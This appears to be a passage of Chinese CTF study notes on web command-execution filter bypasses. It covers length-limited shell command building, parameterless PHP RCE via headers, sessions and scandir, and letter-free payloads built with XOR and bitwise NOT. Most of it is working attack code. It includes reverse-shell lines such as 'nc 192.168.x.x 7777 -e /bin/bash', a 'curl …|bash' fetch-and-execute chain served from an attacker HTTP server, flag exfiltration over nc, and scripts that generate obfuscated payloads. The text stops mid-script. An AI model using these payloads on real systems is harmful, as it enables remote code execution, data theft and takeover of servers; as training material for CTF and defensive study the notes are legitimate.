<h2 id="十一、长度过滤绕过"><a href="#十一、长度过滤绕过" class="headerlink" title="十一、长度过滤绕过"></a>十一、长度过滤绕过</h2><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><p>1.&gt; <code>echo &quot;benben&quot; &gt; a</code>创建a文件，再次创建会覆盖	touch a为创建一个空文件a<br>2.&gt;&gt; <code>echo &quot;benben&quot; &gt;&gt; a</code>追加内容<br>3.\ 换行 <code>cat a等价于 c\换行a\换行 t\换行 a</code><br>4.ls -t	ls排序，按文件名排序：符号&gt;数字&gt;字符串<br>        ls -t排序，按时间顺序排序，最近&gt;最远<br>组合运用：把一些很短的文件名拼接成可执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;/fl\\ <span class="comment">#两个\\是把\实体化变为字符</span></span><br><span class="line">&gt;t\ \\ <span class="comment">#t后面要有\空格</span></span><br><span class="line">&gt;ca\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;a</span><br><span class="line"><span class="built_in">cat</span> a</span><br><span class="line">----&gt;</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag <span class="comment">#也就是cat /flag</span></span><br><span class="line">----&gt;</span><br><span class="line">. a <span class="comment">#执行a: bash a or ./a or sh a</span></span><br></pre></td></tr></table></figure>

<p>5.dir：基本上和ls一样 优点：开头是d，次序靠前，按列输出不换行<br>$(dir *):把第一个文件名执行，第二个以后的作为参数输出，再执行<br>6.rev flag	把flag反向输出</p>
<h3 id="二、长度为七的绕过"><a href="#二、长度为七的绕过" class="headerlink" title="二、长度为七的绕过"></a>二、长度为七的绕过</h3><p><code>cat flag|nc 192.168.xxx.xxx 7777</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;7777</span><br><span class="line">?cmd=&gt;\ \\</span><br><span class="line">?cmd=&gt;xxx\\</span><br><span class="line">?cmd=&gt;xxx.\\</span><br><span class="line">?cmd=&gt;168.\\</span><br><span class="line">?cmd=&gt;192.\\</span><br><span class="line">?cmd=&gt;c\ \\</span><br><span class="line">?cmd=&gt;\|n\\ <span class="comment">#管道符要实体化</span></span><br><span class="line">?cmd=&gt;flag\\</span><br><span class="line">?cmd=&gt;t\ \\</span><br><span class="line">?cmd=&gt;ca\\</span><br><span class="line">?cmd=<span class="built_in">ls</span> -t&gt;a<span class="comment">#刚好7字符</span></span><br><span class="line">?cmd=sh a</span><br></pre></td></tr></table></figure>

<h3 id="三、长度为五的绕过"><a href="#三、长度为五的绕过" class="headerlink" title="三、长度为五的绕过"></a>三、长度为五的绕过</h3><p>新的问题：1.ls -t&gt;a超过5个字符	2.空格&gt;\ \刚好5个字符，但是这个文件只能有一个，其他的空格无法构造</p>
<p>解决方法：<code>curl 192.168.1.161|bash</code>，将自己开的服务器的index.html代码执行，反弹shell</p>
<p>执行<code>nc 192.168.x.x 7777 -e /bin/bash</code></p>
<p>步骤一：构造ls -t&gt;y</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">ls</span>\\</span><br><span class="line"><span class="comment">#因为ls的顺序会把字符串ls\放到最后导致命令顺序错误，先构造一个字符开头_的文件放进去，字符&gt;数字&gt;字符串,都有特殊字符的按时间顺序，先创建的在前</span></span><br><span class="line"><span class="built_in">ls</span>&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y <span class="comment">#这时候的ls为&#x27;（空格）-t&gt;y _ ls\&#x27;</span></span><br><span class="line"><span class="built_in">ls</span>&gt;&gt;_ <span class="comment">#追加内容到ls\\之后，即可执行ls -t&gt;y,后面的_ ls\不影响代码执行</span></span><br></pre></td></tr></table></figure>

<p>步骤二：构造curl 192.168.1.161|bash</p>
<p>从后往前</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></p>
<p>执行代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh _ <span class="comment">#生成y,y就是所要执行的语句</span></span><br><span class="line">sh y <span class="comment">#执行语句</span></span><br></pre></td></tr></table></figure>

<p>搭建一个server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> index.html</span><br><span class="line">vim index.html <span class="comment">#输入nc 192.168.x.x 7777 -e /bin/bash</span></span><br><span class="line">python -m http.server 80 <span class="comment">#访问192.168.x.x即可</span></span><br><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>

<h3 id="四、长度为四的绕过"><a href="#四、长度为四的绕过" class="headerlink" title="四、长度为四的绕过"></a>四、长度为四的绕过</h3><p>新的问题：ls&gt;&gt;_ 超过四个</p>
<p>步骤一：构造ls -t&gt;g<br>步骤二：构造一个反弹shell curl 0xC0A801A1|bash 16进制地址</p>
<p>*:相当于$(dir *)执行第一个文件名，后面的作为参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span> <span class="comment">#dir g&gt; sl t- 按照字母顺序排序,这样rev之后顺序不对，所以在-t后加一个h参数(显示时间)，来保证-t在中间</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改后的代码</span></span><br><span class="line">&gt;\;g <span class="comment">#这里的分号(实体化)是用来防止其他自带文件名的影响命令执行</span></span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">*&gt;v	<span class="comment">#执行dir命令(加了空格)，输出g&gt; ht- sl到v文件</span></span><br><span class="line"><span class="comment">#rev v 得到正向命令，但是长度大于4</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x <span class="comment">#*是通配符，前能匹配rev，后能执行v,输出rev v到x,x就是正向的命令ls -th&gt;g</span></span><br></pre></td></tr></table></figure>

<p>步骤二：十六进制地址编码</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></p>
<h2 id="十二、无参数命令执行"><a href="#十二、无参数命令执行" class="headerlink" title="十二、无参数命令执行"></a>十二、无参数命令执行</h2><p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"></p>
<p>正则表达式</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"></p>
<p>只有a()的括号里面没有内容的时候才会执行，(?R)代表递归，a(b())嵌套也会执行</p>
<h3 id="1-请求头绕过"><a href="#1-请求头绕过" class="headerlink" title="1.请求头绕过"></a>1.请求头绕过</h3><p>getallheaders()：获取所有http请求标头,无回显，需要用print_r()括住，与我们提交的相反</p>
<p>php&gt;&#x3D;5.4 or php7</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(); <span class="comment">#取最后一行，也就是我们发送报文的第一行host</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>(); <span class="comment">#取第一行，也就是我们发送报文的最后一行connection</span></span><br><span class="line"><span class="comment">#把最后一行改成想要执行的命令system(&#x27;cat flag&#x27;)</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure>

<p>可以自己创一个头</p>
<p>可以用apache_request_headers()替换,仅当服务器是apache搭建时可用</p>
<h3 id="2-无参数全局变量RCE"><a href="#2-无参数全局变量RCE" class="headerlink" title="2.无参数全局变量RCE"></a>2.无参数全局变量RCE</h3><p>适用于php5&#x2F;7</p>
<p>get_defined_vars() 返回所有已定义变量的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>()));&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">#再取一个end即可单独得到cmd,改成eval即可执行指令</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/9.png"></p>
<p>可以把cmd(可更改)插入数组</p>
<h3 id="3-无参数session-RCE-php5"><a href="#3-无参数session-RCE-php5" class="headerlink" title="3.无参数session RCE -php5"></a>3.无参数session RCE -php5</h3><p>session_start()：启用新回话&#x2F;重用现有会话</p>
<p>sesion_id(session_start())：返回PHPSESSID的值</p>
<p>show_source()可以看到值，print_r()不行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">eval</span>(<span class="title function_ invoke__">sesion_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="comment">#burp抓包更改Cookie里的PHPSESSID为命令，有特殊字符的命令无法执行，使用hex编码(hackbar)</span></span><br><span class="line">?cmd=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">sesion_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure>

<h3 id="4-scandir读取"><a href="#4-scandir读取" class="headerlink" title="4.scandir读取"></a>4.scandir读取</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">scandir</span>()</span><br><span class="line">    <span class="comment">#无回显，括号内.为显示当前目录文件</span></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">getcwd</span>() <span class="comment">#取得当前工作目录（php4）</span></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">current</span>() <span class="comment">#相当于pos(),取第一个内容的值</span></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">next</span>() <span class="comment">#取第二个内容的值</span></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">array_reverse</span>() <span class="comment">#反向排列数组/文件</span></span><br><span class="line"><span class="number">6</span>.<span class="title function_ invoke__">array_flip</span>() <span class="comment">#将键和值对调，配合array_rand()</span></span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">array_rand</span>() <span class="comment">#随机取得数组的一个键名</span></span><br><span class="line"><span class="number">8</span>.<span class="title function_ invoke__">chdir</span>() <span class="comment">#同cd</span></span><br><span class="line"><span class="number">9</span>.<span class="title function_ invoke__">strrev</span>() <span class="comment">#翻转给定字符串</span></span><br><span class="line"><span class="number">10</span>.<span class="title function_ invoke__">crypt</span>() <span class="comment">#加密</span></span><br><span class="line"><span class="number">11</span>.<span class="title function_ invoke__">hebrevc</span>() <span class="comment">#从右至左的流转换为从左至右的流</span></span><br><span class="line"><span class="number">12</span>.<span class="title function_ invoke__">localeconv</span>() <span class="comment">#得到的数组的第一个的值是&#x27;.&#x27;,可用pos(localconv())代替&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment">#把最后一行翻转到第一行，再取第一行</span></span><br><span class="line"><span class="comment">#pos(localconv())也可以用getcwd()，使用的是绝对路径</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取上级文件</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()) <span class="comment">#上一级目录</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="comment">#但是这里不能show_source读取文件，因为show_source默认为网站目录，使用chdir转换目录</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))))));</span><br><span class="line">#如果要读取的文件不在开头末尾，用rand</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))));   </span><br><span class="line">#注意外面的<span class="title function_ invoke__">dirname</span>()由于不能再向上读取，读取到的是自己，也就是.</span><br></pre></td></tr></table></figure>

<p>另外两种读取方法：（没用getcwd(),dirname())</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取根目录 -&gt;构造/</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/11.png"></p>
<p>取第一个字符：ord()只能随机一个字符hex编码，chr()只能随机一个字符解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br><span class="line"><span class="comment">#有可能选到/,读取成功</span></span><br><span class="line"><span class="comment">#读取文件(随机),可以不固定，如果固定必须加dirname()</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))));</span><br><span class="line"><span class="comment">#用burp-&gt;intruder-&gt;改一个无关的值-&gt;numbers来大量随机</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))))));</span><br><span class="line"><span class="comment">#因为可能随机到..导致目录变更，用chdir固定</span></span><br></pre></td></tr></table></figure>

<h2 id="十三、无字母数字命令执行"><a href="#十三、无字母数字命令执行" class="headerlink" title="十三、无字母数字命令执行"></a>十三、无字母数字命令执行</h2><h3 id="一、异或运算绕过"><a href="#一、异或运算绕过" class="headerlink" title="一、异或运算绕过"></a>一、异或运算绕过</h3><p>原理：两个字符异或运算是ascii码的二进制按位进行异或运算，得到新字符。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot; &quot;</span>^<span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="variable">$_</span>(); <span class="comment">#执行命令</span></span><br><span class="line">?cmd=<span class="variable">$_</span>=<span class="string">&quot;+(+).&amp;/&quot;</span>^<span class="string">&quot;[@[@@@@&quot;</span>;<span class="variable">$_</span>();	<span class="comment">#加号要url编码，执行phpinfo()</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php5 拼接assert($_POST[&#x27;_&#x27;]);</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">	<span class="variable">$b</span>=<span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$$b</span>;</span><br><span class="line">	<span class="variable">$a</span>(<span class="variable">$c</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>异或运算得到</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/12.png"></p>
<p>记得编码，配合post方法_&#x3D;nc 192.168.x.x -e &#x2F;bin&#x2F;bash;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php7不能用assert</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$_</span>;</span><br><span class="line">`<span class="variable">$__</span>[<span class="string">&#x27;_&#x27;</span>]`; <span class="comment">#反引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#必须用反弹shell</span></span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;phpinfo&quot;</span>; <span class="comment">#改成你的命令</span></span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第一部分： &quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第二部分： &quot;</span>.<span class="variable">$result2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#在这里验证一下</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;+(+).&amp;/&quot;</span>^<span class="string">&quot;[@[@@@@&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="二、取反绕过"><a href="#二、取反绕过" class="headerlink" title="二、取反绕过"></a>二、取反绕过</h3><p>~（      ）：二进制取反</p>
<p>~（urldecode(%9e)); &#x3D; a	因为9e超过了16进制最大，用url编码解码</p>
<p>中文字符：’极’ -&gt; e69e81 -&gt;有三位（0,1,2），每位两个字母，所以$a{1}就是9e，~($a{1})是a</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/13.png"></p>
<p>脚本neg.php，所有的中文都是取{1}</p>
<p>或者直接用url编码assert post</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/14.png"></p>
<p>php7用反引号！<code>$_POST[_]</code>，无回显，反弹shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> =<span class="string">&quot;phpinfo&quot;</span> ; <span class="comment">#改成你的命令</span></span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span 